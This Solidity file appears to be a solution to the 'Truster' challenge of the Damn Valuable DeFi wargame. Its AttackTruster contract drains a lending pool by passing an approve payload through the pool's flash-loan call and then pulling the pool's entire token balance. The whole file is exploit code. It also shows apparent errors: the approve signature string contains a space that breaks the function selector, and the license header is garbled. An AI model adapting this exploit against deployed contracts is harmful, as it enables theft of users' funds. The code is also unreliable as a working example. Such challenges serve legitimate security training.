// SPDX-L:License-Identifier: MIT;

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol"; 
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract AttackTruster {
    function attack(DamnValuableToken token, TrusterLenderPool pool) public {
        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory approvePayload = abi.encodeWithSignature("approve(address, uint256)", address(this), poolBalance);

        pool.flashLoan(0, msg.sender, address(pool), approvePayload);

        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}